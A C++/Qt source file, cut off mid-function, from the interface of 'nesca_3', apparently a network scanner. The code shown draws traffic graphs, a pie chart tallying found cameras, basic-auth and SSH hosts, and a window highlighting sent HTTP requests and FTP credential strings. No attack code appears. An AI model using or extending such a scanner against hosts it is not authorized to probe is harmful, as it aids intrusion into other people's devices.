QList<int> gLOL3;
QList<int> gLOL4;
QList<int> gLOL5;
QList<int> gLOL6;
QList<int> gLOL7;
bool QOSWait = false;
void nesca_3::slotQoSAddLine()
{
	QOSWait = true;
	sceneGraph->clear();
	sceneGrid2->clear();
	sceneUpper->clear();

	float gHeight = ui->graphicLog->height();
	
	float fact = (float)100 / (float)DrawerTh_QoSScanner::MaxDataVal;
	
	if(QoSStep > 268) 
	{
		DrawerTh_QoSScanner::MaxDataVal = 1;
		QoSStep = 1;
		gLOL0.clear();
		gLOL1.clear();
		gLOL2.clear();
		gLOL3.clear();
		gLOL4.clear();
		gLOL5.clear();
		gLOL6.clear();
		gLOL7.clear();
	};
	gLOL0.push_back(lstOfLabels[0]);
	gLOL1.push_back(lstOfLabels[1]);
	gLOL2.push_back(lstOfLabels[2]);
	gLOL3.push_back(lstOfLabels[3]);
	gLOL4.push_back(lstOfLabels[4]);
	gLOL5.push_back(lstOfLabels[5]);
	gLOL6.push_back(lstOfLabels[6]);
	gLOL7.push_back(lstOfLabels[7]);

	int d0;
	int d1;
	int d2;
	int d3;
	int d4;
	int d5;
	int d6;
	int d7;

	for(int QoSStepi = 0; QoSStepi < QoSStep; ++QoSStepi)
	{
		if(QoSStepi < gLOL0.size()
			&& QoSStepi < gLOL1.size()
			&& QoSStepi < gLOL2.size()
			&& QoSStepi < gLOL3.size()
			&& QoSStepi < gLOL4.size()
			&& QoSStepi < gLOL5.size()
			&& QoSStepi < gLOL6.size()
			&& QoSStepi < gLOL7.size()
			)
		{
			d0 = gHeight - gLOL0[QoSStepi] * fact - 1;
			d1 = gHeight - gLOL1[QoSStepi] * fact - 1;
			d2 = gHeight - gLOL2[QoSStepi] * fact - 1;
			d3 = gHeight - gLOL3[QoSStepi] * fact - 1;
			d4 = gHeight - gLOL4[QoSStepi] * fact - 1;
			d5 = gHeight - gLOL5[QoSStepi] * fact - 1;
			d6 = gHeight - gLOL6[QoSStepi] * fact - 1;
			d7 = gHeight - gLOL7[QoSStepi] * fact - 1;

			sceneGraph->addLine(QoSStepi, gHeight, QoSStepi, d0, penQoS0);
			sceneGraph->addLine(QoSStepi, gHeight, QoSStepi, d1, penQoS1);
			sceneGraph->addLine(QoSStepi, gHeight, QoSStepi, d2, penQoS2);
			sceneGraph->addLine(QoSStepi, gHeight, QoSStepi, d3, penQoS3);
			sceneGraph->addLine(QoSStepi, gHeight, QoSStepi, d4, penQoS4);
			sceneGraph->addLine(QoSStepi, gHeight, QoSStepi, d5, penQoS5);
			sceneGraph->addLine(QoSStepi, gHeight, QoSStepi, d6, penQoS6);
			sceneGraph->addLine(QoSStepi, gHeight, QoSStepi, d7, penQoS7);
		};
	};
	QFont fnt;
	fnt.setFamily("Eurostile");
	fnt.setPixelSize(10);

	QGraphicsTextItem *item = sceneUpper->addText("Max = " + QString::number(DrawerTh_QoSScanner::MaxDataVal), fnt);
	item->setX(215);
	item->setDefaultTextColor(Qt::white);
	QOSWait = false;
}

void nesca_3::slotQoSAddGrid()
{
	sceneGrid->clear();

	int gWidth = ui->graphicLog->width();
	if (DrawerTh_QoSScanner::MaxDataVal > 100) DrawerTh_QoSScanner::MaxDataVal = 100;
	float fact = (float)100 / (float)DrawerTh_QoSScanner::MaxDataVal;

	float th = 0;
	for(int i = 0; i < 100; ++i)
	{
		th += fact;
		sceneGrid->addLine(0, th, gWidth, th, rpen);
	};
}

void nesca_3::slotAddLine(int x1, int y1, int x2, int y2)
{
	sceneGrid->addLine(x1, y1, x2, y2, pen);
	if(sceneGrid->items().size() > 10) 
	{
		sceneGrid->removeItem(vectOld[10]);
		sceneGrid->items().pop_back();
	};
}

void nesca_3::slotAddPolyLine()
{
	if(ME2ScanFlag)
	{
		QPainterPath path;
		if (DrawerTh_ME2Scanner::vecSize > 0)
		{
			path.moveTo(DrawerTh_ME2Scanner::polyVect[0]);
			for (int i = 1; i < DrawerTh_ME2Scanner::vecSize; ++i)
			{
				path.lineTo(DrawerTh_ME2Scanner::polyVect[i]);
			};
		};
		
		QGraphicsPathItem* itm = new QGraphicsPathItem(path);
		itm->setPen(pen2i);
		sceneGraph->addItem(itm);
		DrawerTh_ME2Scanner::itmList.push_front(itm);
		DrawerTh_ME2Scanner::polyVect.clear();

		int u = 0;
		double uu = 1.0;
		for (int i = 0; i < DrawerTh_ME2Scanner::itmList.size(); ++i)
		{
			int y = u - i - 1;
			itm = DrawerTh_ME2Scanner::itmList[i];
			itm->setY(y);
			itm->setOpacity(uu);
			uu -= 0.027;
			u -= 1;
		};

		while (DrawerTh_ME2Scanner::itmList.size() > 38)
		{
			sceneGraph->removeItem(DrawerTh_ME2Scanner::itmList[38]);
			delete DrawerTh_ME2Scanner::itmList[38];
			DrawerTh_ME2Scanner::itmList.pop_back();
		};
	};
}

void nesca_3::slotDrawGrid()
{
	sceneGrid->clear();
}

void nesca_3::slotDrawActivityGrid()
{
	sceneActivityGrid->clear();
	QPen penActivity(QColor(170, 170, 170, 150), 0.1);

	int gHeight = ui->graphicActivityGrid->height();
	
	//Vertical
	for(int i = 0; i < 100; i+=10)
	{
		sceneActivityGrid->addLine(i, 0, i, gHeight, penActivity);
	};
}

void nesca_3::slotDrawActivityLine(QString data)
{
	sceneActivity->clear();

	QPen penActivity(QColor(255, 255, 255), 0.3);
	int as = 0;

	for(int i = 1; i < actLst.size(); ++i)
	{
		as += 2;
		sceneActivity->addLine(as - 2, 16 - actLst[i - 1], as, 16 - actLst[i], penActivity);
	};
	QFont fnt;
	fnt.setFamily("Eurostile");
	fnt.setPixelSize(9);
	QGraphicsTextItem *titem = sceneActivity->addText(data, fnt);
	titem->setX(43 - data.length()*2);
	titem->setY(-5);
	titem->setDefaultTextColor(QColor(255, 255, 255, 80));
}

void nesca_3::slotDrawVoiceGrid(int factor)
{
	sceneGrid->clear();
	QPen penActivity(QColor(170, 170, 170, factor), 0.1);
	QPen rpenActivity(QColor(255, 0, 0, factor), 0.1);

	int gWidth = ui->graphicLog->width();
	int gHeight = ui->graphicLog->height();

	//Horizontal
	int th = 0;
	for(int i = 0; i < 100; i+=5)
	{
		th = i - 2;
		if(i % 10 == 0) sceneGrid->addLine(0, th, gWidth, th, rpenActivity);
		else sceneGrid->addLine(0, th, gWidth, th, penActivity);
	};

	//Vertical
	for(int i = 0; i < 270; i+=10)
	{
		sceneGrid->addLine(i, 0, i, gHeight, penActivity);
	};
}

void nesca_3::activateME2ScanScene()
{
	if(ME2ScanFlag == false)
	{
		ui->me2ScanBut->setStyleSheet("color: rgb(216, 216, 216);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(255, 255, 255, 40);");
		ui->QoSScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		ui->VoiceScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		ui->PieStatBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");

		sceneUpper->clear();
		sceneGrid->clear();
		sceneGrid2->clear();
		sceneGraph->clear();
		sceneVoice->clear();
			
		vAlivLst.clear();
		vAnomLst.clear();
		vWFLst.clear();
		vSuspLst.clear();
		vLowlLst.clear();
		vBALst.clear();
		vOvrlLst.clear();
		vSSHLst.clear();
		vectOld.clear();

		ME2ScanFlag = true;
		QoSScanFlag = false;
		VoiceScanFlag = false;
		PieStatFlag = false;

		if(dtHN->isRunning() == false) 
		{
			dtHN->start();
		};

		if(dtME2->isRunning() == false) 
		{
			dtME2->start();
		};
	};
}

void nesca_3::activateQoSScanBut()
{
	if(QoSScanFlag == false)
	{
		ui->QoSScanBut->setStyleSheet("color: rgb(216, 216, 216);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(255, 255, 255, 40);");
		ui->PieStatBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		ui->VoiceScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		ui->me2ScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		
		ui->RedLabel->setVisible(true);
		ui->GreenLabel->setVisible(true);
		ui->CyanLabel->setVisible(true);
		ui->BlueLabel->setVisible(true);
		ui->PinkLabel->setVisible(true);
		ui->YellowLabel->setVisible(true);
		ui->WhiteLabel->setVisible(true);
		ui->DredLabel->setVisible(true);

		ui->labelAnomaly->setVisible(true);
		ui->labelBA->setVisible(true);
		ui->labelFiltered->setVisible(true);
		ui->labelBads->setVisible(true);
		ui->labelLowloads->setVisible(true);
		ui->labelOverloads->setVisible(true);
		ui->labelAlives->setVisible(true);
		ui->labelSSH->setVisible(true);
		
		vAlivLst.clear();
		vAnomLst.clear();
		vWFLst.clear();
		vSuspLst.clear();
		vLowlLst.clear();
		vBALst.clear();
		vOvrlLst.clear();
		vSSHLst.clear();
		vectOld.clear();

		ME2ScanFlag = false;
		QoSScanFlag = true;
		VoiceScanFlag = false;
		PieStatFlag = false;

		QoSStep = 1;
		DrawerTh_QoSScanner::MaxDataVal = 1;

		sceneGrid2->clear();
		sceneGraph->clear();
		sceneGrid->clear();
		sceneUpper->clear();
		sceneTextPlacer->clear();
		sceneVoice->clear();
		DrawerTh_ME2Scanner::polyVect.clear();

		if(dtQoS->isRunning() == false) dtQoS->start();
		if(dtGridQoS->isRunning() == false) dtGridQoS->start();
	};
}

void nesca_3::activateVoiceScanBut()
{
	if(VoiceScanFlag == false)
	{
		ui->VoiceScanBut->setStyleSheet("color: rgb(216, 216, 216);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(255, 255, 255, 40);");
		ui->me2ScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		ui->QoSScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		ui->PieStatBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");

		ui->RedLabel->setVisible(true);
		ui->GreenLabel->setVisible(true);
		ui->CyanLabel->setVisible(true);
		ui->BlueLabel->setVisible(true);
		ui->PinkLabel->setVisible(true);
		ui->YellowLabel->setVisible(true);
		ui->WhiteLabel->setVisible(true);
		ui->DredLabel->setVisible(true);

		ui->labelAnomaly->setVisible(true);
		ui->labelBA->setVisible(true);
		ui->labelFiltered->setVisible(true);
		ui->labelBads->setVisible(true);
		ui->labelLowloads->setVisible(true);
		ui->labelOverloads->setVisible(true);
		ui->labelAlives->setVisible(true);
		ui->labelSSH->setVisible(true);

		ME2ScanFlag = false;
		QoSScanFlag = false;
		VoiceScanFlag = true;
		PieStatFlag = false;

		sceneGrid2->clear();
		sceneGraph->clear();
		sceneGrid->clear();
		sceneUpper->clear();
		sceneVoice->clear();

		if(vsTh->isRunning() == false) vsTh->start();
	};
}

void nesca_3::slotUpdatePie()
{
	sceneGraph->clear();
	vsTh->doEmitDrawGrid(70);

	int goods = saved;
	int nAlive = found - goods;
	float degree = (16*360) / (float)100;

	float perc0 = ((float)nAlive * 100) * degree;
	float perc1 = ((float)PieCamerasC1/(float)(found) * 100) * degree;
	float perc2 = ((float)PieOther/(float)(found) * 100) * degree;
	float perc3 = ((float)PieBA/(float)(found) * 100) * degree;
	//float perc4 = ((float)PieLowl/(float)(found) * 100) * degree;
	float perc4 = 0;
	//float perc5 = ((float)PieWF/(float)(found) * 100) * degree;
	float perc5 = 0;
	float perc6 = ((float)PieSSH/(float)(found) * 100) * degree;

	QString dataSaved = "Saved:\t"	+ QString::number(goods/(float)(found > 0 ? found : 1) * 100) + "%(" + QString::number(goods) + ")";
	QString dataParsed = "Filtered:\t"	+ QString::number((found - goods)/(float)(found > 0 ? found : 1) * 100) + "%(" + QString::number(found - goods) + ")";
	QString dataOnline = "Online:\t"	+ QString::number(found);
	QString dataAnom = "Cameras:\t"	+ QString::number(PieCamerasC1 / (float)(goods > 0 ? goods : 1) * 100) + "%";
	QString dataBA = "Auth:\t"	+ QString::number(PieBA/(float)(goods > 0 ? goods : 1) * 100) + "%";
	QString dataSusp = "Other:\t"	+ QString::number(PieOther / (float)(goods > 0 ? goods : 1) * 100) + "%";
	QString dataLowl = "--:\t"	+ QString::number(0/(float)(goods > 0 ? goods : 1) * 100) + "%";
	QString dataWF = "--:\t"	+ QString::number(0 / (float)(goods > 0 ? goods : 1) * 100) + "%";
	QString dataSSH = "SSH:\t"	+ QString::number(PieSSH/(float)(goods > 0 ? goods : 1) * 100) + "%";

	int dataX = 1;
	int dataY = 13;
	
	QGraphicsTextItem *titem = sceneGraph->addText(dataOnline, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(-5);
	titem->setDefaultTextColor(QColor(255, 255, 255, 130));

	titem = sceneGraph->addText(dataSaved, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(5);
	titem->setDefaultTextColor(QColor(255, 255, 255, 130));
	
	titem = sceneGraph->addText(dataParsed, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(15);
	titem->setDefaultTextColor(QColor(255, 255, 255, 255));

	titem = sceneGraph->addText(dataAnom, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(dataY + 17);
	titem->setDefaultTextColor(QColor("red"));

	titem = sceneGraph->addText(dataBA, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(dataY + 27);
	titem->setDefaultTextColor(Qt::darkCyan);

	titem = sceneGraph->addText(dataSusp, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(dataY + 37);
	titem->setDefaultTextColor(Qt::darkRed);

	titem = sceneGraph->addText(dataLowl, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(dataY + 47);
	titem->setDefaultTextColor(Qt::magenta);

	titem = sceneGraph->addText(dataWF, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(dataY + 56);
	titem->setDefaultTextColor(Qt::darkGray);

	titem = sceneGraph->addText(dataSSH, multiFontSmallFontPie);
	titem->setX(dataX);
	titem->setY(dataY + 66);
	titem->setDefaultTextColor(Qt::darkRed);

	int PieX = 155;
	int PieW = 112;

	//Alives
	QGraphicsEllipseItem* item = NULL;
	if(perc0 == 0)
	{
		item = new QGraphicsEllipseItem(PieX, 2, PieW, 97);
		item->setStartAngle(0);
		perc0 = 16*360;
		item->setSpanAngle(perc0);
		item->setBrush(QBrush(QColor(255, 255, 255, 10)));		
		sceneGraph->addItem(item);	
	}
	else
	{
		item = new QGraphicsEllipseItem(PieX, 2, PieW, 97);
		item->setStartAngle(0);
		item->setSpanAngle(perc0);
		item->setBrush(QBrush(Qt::white));
		sceneGraph->addItem(item);	
	};
	//Cameras
	if(perc1 > 0)
	{
		item = new QGraphicsEllipseItem(PieX, 2, PieW, 97);
		item->setStartAngle(perc0);
		item->setSpanAngle(perc1);
		item->setBrush(QBrush(Qt::red));
		sceneGraph->addItem(item);
	};
	//Suspicious
	if(perc2 > 0)
	{
		item = new QGraphicsEllipseItem(PieX, 2, PieW, 97);
		item->setStartAngle(perc0 + perc1);
		item->setSpanAngle(perc2);
		item->setBrush(QBrush(Qt::darkRed));
		sceneGraph->addItem(item);
	};
	//BA
	if(perc3 > 0)
	{
		item = new QGraphicsEllipseItem(PieX, 2, PieW, 97);
		item->setStartAngle(perc0 + perc1 + perc2);
		item->setSpanAngle(perc3);
		item->setBrush(QBrush(Qt::darkCyan));
		sceneGraph->addItem(item);
	};
	//Lowl
	if(perc4 > 0)
	{
		item = new QGraphicsEllipseItem(PieX, 2, PieW, 97);
		item->setStartAngle(perc0 + perc1 + perc2 + perc3);
		item->setSpanAngle(perc4);
		item->setBrush(QBrush(Qt::magenta));
		sceneGraph->addItem(item);
	};
	//WF
	if(perc5 > 0)
	{
		item = new QGraphicsEllipseItem(PieX, 2, PieW, 97);
		item->setStartAngle(perc0 + perc1 + perc2 + perc3 + perc4);
		item->setSpanAngle(perc5);
		item->setBrush(QBrush(Qt::darkGray));
		sceneGraph->addItem(item);
	};
	//SSH
	if(perc6 > 0)
	{
		item = new QGraphicsEllipseItem(PieX, 2, PieW, 97);
		item->setStartAngle(perc0 + perc1 + perc2 + perc3 + perc4 + perc5);
		item->setSpanAngle(perc6);
		item->setBrush(QBrush(Qt::darkRed));
		sceneGraph->addItem(item);
	};
}

void nesca_3::activatePieStatBut()
{
	if(PieStatFlag == false)
	{
		ui->PieStatBut->setStyleSheet("color: rgb(216, 216, 216);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(255, 255, 255, 40);");
		ui->QoSScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		ui->VoiceScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		ui->me2ScanBut->setStyleSheet("color: rgb(130, 130, 130);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(130, 130, 130, 80);");
		
		ui->RedLabel->setVisible(false);
		ui->GreenLabel->setVisible(false);
		ui->CyanLabel->setVisible(false);
		ui->BlueLabel->setVisible(false);
		ui->PinkLabel->setVisible(false);
		ui->YellowLabel->setVisible(false);
		ui->WhiteLabel->setVisible(false);
		ui->DredLabel->setVisible(false);

		ui->labelAnomaly->setVisible(false);
		ui->labelBA->setVisible(false);
		ui->labelFiltered->setVisible(false);
		ui->labelBads->setVisible(false);
		ui->labelLowloads->setVisible(false);
		ui->labelOverloads->setVisible(false);
		ui->labelAlives->setVisible(false);
		ui->labelSSH->setVisible(false);

		ME2ScanFlag = false;
		QoSScanFlag = false;
		VoiceScanFlag = false;
		PieStatFlag = true;

		sceneGrid2->clear();
		sceneGraph->clear();
		sceneGrid->clear();
		sceneUpper->clear();
		sceneTextPlacer->clear();
		sceneVoice->clear();

		if(psTh->isRunning() == false) psTh->start();
	};
}

void nesca_3::switchDataFields()
{
	if (!BALogSwitched)
	{
		BALogSwitched = true;
		ui->dataText->lower();
		ui->BATableView->raise();
		ui->switcherBut->setText(">");
	}
	else
	{
		BAModel->clear();
		BALogSwitched = false;
		ui->dataText->raise();
		ui->BATableView->lower();
		ui->switcherBut->setText("<");
	};
}

void nesca_3::slotTabChanged(int index){
	if(index <= 2) savedTabIndex = index;
}

void nesca_3::switchToJobMode()
{
	if(ui->widgetJOB->geometry().x() == 500)
	{
		widgetIsHidden = false;
		ui->widgetJOB->setGeometry(QRect(1, 44, 498, 730));
		ui->JobModeBut->setStyleSheet("background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(0, 214, 0, 40);color: rgb(0, 214, 0);");
	}
	else
	{
		ui->widgetJOB->setGeometry(QRect(500, 44, 500, 730));
		ui->JobModeBut->setStyleSheet("color: rgb(216, 216, 216);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(255, 255, 255, 40);");
	};
}

void copyToClipboardLocation() {
	//ui->currentDirectoryLine->selectAll();
	//QClipboard *c = QApplication::clipboard();
	QString dir = ui->currentDirectoryLine->text();
	//c->setText(dir);

	QDesktopServices::openUrl(QUrl::fromLocalFile(dir));
}
bool nesca_3::eventFilter(QObject* obj, QEvent *event)
{
	if (obj == qwm)
	{
		if(MapWidgetOpened && event->type() == QEvent::WindowActivate)
		{
			this->raise();
		};
		if (event->type() == QEvent::KeyPress)
		{
			QKeyEvent* keyEvent = static_cast<QKeyEvent*>(event);
			if(keyEvent->modifiers() == Qt::ControlModifier)
			{
				event->accept();
				return true;
			};
			return false;
		}
		else if (event->type() == QEvent::KeyRelease) return true;
		return false;
	}
	else if (obj == ui->currentDirectoryLine && event->type() == QEvent::MouseButtonPress)
	{
		copyToClipboardLocation();
	}
	else
	{
		if (event->type() == QEvent::KeyPress)
		{
			QKeyEvent* keyEvent = static_cast<QKeyEvent*>(event);
			if(keyEvent->modifiers() == Qt::ControlModifier)
			{
				event->accept();
				return true;
			};
			return false;
		}
		else if(event->type() == QEvent::KeyRelease)
		{
			event->accept();
			return true;
		}
		else if(MapWidgetOpened && event->type() == QEvent::WindowActivate)
		{
			qwm->raise();
		};
		return false;
	};
}

void nesca_3::slotClearLogs()
{
	ui->dataText->clear();
	BAModel->clear();
}

int c = 1;
void nesca_3::slotSaveImage(QAction *qwe)
{
	QObject *smB = this->sender();
	int ci = ui->tabMainWidget->currentIndex();
	QTime QT = QTime::currentTime();
	QString t("*.png");

	if(smB == menuPS)
	{
		if(ME2ScanFlag || VoiceScanFlag)
		{
			QString fn = QString::number(QT.msec()) + "_" + 
				(ME2ScanFlag ? QString("ME2") : QString("Voice")) + "_" + 
				(ci == 0 ? ui->ipLine->text() : ui->dnsLine->text()) + ".png";
			int ax = 27;
			int ay = 2;
			int w = ui->graphicLog->width() + 30;
			int h = ui->graphicLog->height() + 30;
			int hOffset = 20;
			int spX = -10;
			int spY = 108;
			int wsp = 40;
			int hsp = 70;

			if(VoiceScanFlag) 
			{
				hOffset = -60;
				spX = 8;
				spY = -1;
				wsp = 0;
				hsp = -3;
			};

			QPixmap pixmap(ui->graphicTextPlacer->width() + 5, ui->graphicTextPlacer->height() + hOffset);
			QPainter painter(&pixmap);
			pixmap.fill(QColor(0, 0, 0));
			sceneTextPlacer->render(&painter, QRect(spX, spY, w + wsp, h + hsp));
			sceneUpper->render(&painter, QRect(ax, ay, w, h));
			sceneVoice->render(&painter, QRect(ax, ay, w, h));
			sceneGraph->render(&painter, QRect(ax, ay + 8, w - 2, h));
			sceneGrid->render(&painter, QRect(ax, ay, w, h));
			sceneGrid2->render(&painter, QRect(ax, ay, w, h));

			QString filename = QFileDialog::getSaveFileName(
			this, 
			tr("Save image"), 
			QDir::currentPath() + "/" + fn,
			".png",
			&t
			);
			if (filename != "") pixmap.save(filename);
		}
		else
		{
			QString fn = QString::number(QT.msec()) + "_" + 
				(PieStatFlag ? "PieStat" : "QoS") + "_" + 
				(ci == 0 ? ui->ipLine->text() : ui->dnsLine->text()) + ".png";

			QPixmap pixmap(ui->graphicLog->width(), ui->graphicLog->height());
			QPainter painter(&pixmap);
			pixmap.fill(Qt::black);

			sceneGrid->render(&painter);
			sceneGrid2->render(&painter);
			sceneGrid2->render(&painter);
			sceneUpper->render(&painter);
			sceneVoice->render(&painter);
			sceneGraph->render(&painter);

			painter.end();
		
			QString filename = QFileDialog::getSaveFileName(
				this,
				tr("Save image"),
				QDir::currentPath() + "/" + fn,
				".png",
				&t
				);
			if (filename != "") pixmap.save(filename);
		};
	};
}

void PieStatView::contextMenuEvent(QContextMenuEvent *event)
{
	menuPS = new QMenu;
	menuPS->addAction("Save image.");
	menuPS->popup(event->globalPos());

	connect(menuPS, SIGNAL(triggered(QAction *)), gthis, SLOT(slotSaveImage(QAction *)));
}

QTextBrowser *SendData;
QTextBrowser *RecvData;
void nesca_3::slotShowDataflow()
{
	if(MapWidgetOpened == false)
	{
		MapWidgetOpened = true;
		ui->DataflowModeBut->setStyleSheet("background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(0, 214, 0, 40);color: rgb(0, 214, 0);");
		qwm = new QWidget();
		qwm->setWindowFlags(Qt::FramelessWindowHint|Qt::SubWindow);
		qwm->installEventFilter(this);
		qwm->setStyleSheet(
			"background-color:qlineargradient(spread:pad, x1:0.541, y1:0.500364, x2:0.54, y2:0, stop:0 rgba(16, 16, 16, 255), stop:1 rgba(0, 0, 0, 255));"
			"border: 1px solid #616161;");
		
		qwm->setGeometry(QMainWindow::x() + ui->widget->width() + 5, QMainWindow::y(), 480, 800);
		qwm->show();
		QFont fnt;
		fnt.setFamily("Eurostile");
		fnt.setPixelSize(10);

		SendData = new QTextBrowser(qwm);
		SendData->setGeometry(5, 5, 470, 370);
		SendData->setStyleSheet("color:rgb(150, 150, 150);");
		SendData->setFont(fnt);
		SendData->show();

		RecvData = new QTextBrowser(qwm);
		RecvData->setGeometry(5, 380, 470, 414);
		RecvData->setStyleSheet("color:rgb(150, 150, 150);");
		RecvData->setFont(fnt);
		RecvData->show();
	}
	else
	{
		ui->DataflowModeBut->setStyleSheet("color: rgb(216, 216, 216);background-color: rgba(2, 2, 2, 0);border: 1px solid rgba(255, 255, 255, 40);");
		delete SendData;
		delete RecvData;
		delete qwm;
		qwm = NULL;
		RecvData = NULL;
		SendData = NULL;
		MapWidgetOpened = false;
	};
}

QGraphicsPathItem *GiveMeGItem(QVector<QPointF> vAnomLst)
{
	QPolygonF qpf;
	QPainterPath path;
	for(int i = 0; i < vAnomLst.size(); ++i)
	{
		qpf.append(vAnomLst[i]);
	};
	if(qpf.size() > 0) 
	{
		path.moveTo(qpf[0]);
		for(int i = 1; i < qpf.size(); ++i) 
		{
			path.lineTo(qpf[i]);
		};
	};
	return new QGraphicsPathItem(path);
}

void nesca_3::slotVoiceAddLine()
{
	int as = 0;
	if(VoiceScanFlag)
	{
		sceneVoice->clear();

		for(int i = 1; i < vAlivLst.size(); ++i)
		{
			as += 2;
			sceneVoice->addLine(as - 2, 120 - vAlivLst[i - 1] - 1, as, 120 - vAlivLst[i] - 1, penQoS0);
		};
		as = 0;
			
		for(int i = 1; i < vAnomLst.size(); ++i)
		{
			as += 2;
			sceneVoice->addLine(as - 2, 120 - vAnomLst[i - 1] - 1, as, 120 - vAnomLst[i] - 1, penQoS1);
		};
		as = 0;
			
		for(int i = 1; i < vWFLst.size(); ++i)
		{
			as += 2;
			sceneVoice->addLine(as - 2, 120 - vWFLst[i - 1] - 1, as, 120 - vWFLst[i] - 1, penQoS2);
		};
		as = 0;
			
		for(int i = 1; i < vSuspLst.size(); ++i)
		{
			as += 2;
			sceneVoice->addLine(as - 2, 120 - vSuspLst[i - 1] - 1, as, 120 - vSuspLst[i] - 1, penQoS3);
		};
		as = 0;
			
		for(int i = 1; i < vLowlLst.size(); ++i)
		{
			as += 2;
			sceneVoice->addLine(as - 2, 120 - vLowlLst[i - 1] - 1, as, 120 - vLowlLst[i] - 1, penQoS4);
		};
		as = 0;
			
		for(int i = 1; i < vBALst.size(); ++i)
		{
			as += 2;
			sceneVoice->addLine(as - 2, 120 - vBALst[i - 1] - 1, as, 120 - vBALst[i] - 1, penQoS5);
		};
		as = 0;
			
		for(int i = 1; i < vOvrlLst.size(); ++i)
		{
			as += 2;
			sceneVoice->addLine(as - 2, 120 - vOvrlLst[i - 1], as, 120 - vOvrlLst[i] - 1, penQoS6);
		};
		as = 0;
						
		for(int i = 1; i < vSSHLst.size(); ++i)
		{
			as += 2;
			sceneVoice->addLine(as - 2, 120 - vSSHLst[i - 1], as, 120 - vSSHLst[i] - 1, penQoS7);
		};
	};
}

QRegExp _rOutProt(" HTTP/1.\\d+");
QRegExp _rOutPath(" /(\\w|\\.|,|/|:|-|_|\\?|!|\\@|#|\\$|%|\\^|&|\\*|\\(|\\)|=|\\+|<|>|;|:|\"|'|~|\\[|\\])* ");
QRegExp _rOutHost("Host: ((\\w|\\d|\\.|:|/)*)\\r\\n");
QRegExp qrp("\\n(.+):");
void nesca_3::slotOutData(QString str)
{
	if(SendData != NULL) 
	{
		_rOutPath.indexIn(str);
		QString prot = _rOutPath.cap(0);
		if(prot.size() > 0) str.replace(prot, "<font color=\"Turquoise\">" + prot + "</font>");
		_rOutHost.indexIn(str);
		prot = _rOutHost.cap(1);
		if(prot.size() > 0) str.replace(prot, "<font color=\"Turquoise\">" + prot + "</font>");
		str.replace("HTTP ", "<font color=\"GoldenRod\">HTTP </font>");
		str.replace("GET ", "<font color=\"GoldenRod\">GET </font>");
		str.replace("POST ", "<font color=\"GoldenRod\">POST </font>");
		str.replace(qrp, "<br><font color=\"GoldenRod\">\\1:</font>");
		str.replace(QRegExp("(ftp:.+@)"), "<font color=\"Crimson\">\\1</font>");

		_rOutProt.indexIn(str);
		prot = _rOutProt.cap(0);
		if(prot.size() > 0) str.replace(prot, "<font color=\"GoldenRod\">" + prot + "</font>");
		str.replace("\r\n", "<br>");

		SendData->append("<br>" + str + "<hr><br>");
	};
}

QRegExp _rIncProt("HTTP/1.\\d+ ");
QRegExp _rIncHost("Host: ((\\w|\\d|\\.|:|/)*)\\r\\n");
QRegExp _rIncTags1("&lt;.{1,8}&gt;");
QRegExp _rIncTagsClose("&lt;/.{1,8}&gt;");
QRegExp _rIncTags2("&lt;.{1,8} ");
QRegExp _rIncTags3("/&gt;");
QRegExp _rIncInnerTags("=&quot;((\\w|\\.|,|/|:|-|_|\\?|!|\\@|#|\\$|%|\\^|&|\\*|\\(|\\)|=|\\+|<|>|;|:|\"|'|~|\\s| )*)&quot;");
QRegExp _rIncScriptTag1("&lt;script&gt;.*&lt;/script&gt;");
QRegExp _rIncScriptTag2("&lt;script .*&lt;/script&gt;");
QRegExp _rIncStyleTag("&lt;style&gt;.*&lt;/style&gt;");

QRegExp _rIncRN("\r\n(_|-|=|.*)*:");
void nesca_3::slotIncData(QString ip, QString str)
{
	if(RecvData != NULL)
	{
		QStringList headNbody = str.split("\r\n\r\n");
		QString tStr;
		QString tagRes;
		QString prot;
		int posTag = 0;
		for(int i = 0; i < headNbody.size(); ++i)
		{
			if(headNbody[i].size() == 0) headNbody.erase(headNbody.begin() + i);
		};
		if(headNbody.size() == 0) return;
		if(headNbody.size() > 1)
		{
			str = headNbody[0];
			tStr = str;

			_rIncRN.setMinimal(true);
			while ((posTag = _rIncRN.indexIn(tStr, posTag)) != -1) 
			{	
				tagRes = _rIncRN.cap(0);
				if(tagRes.size() > 0) 
				{
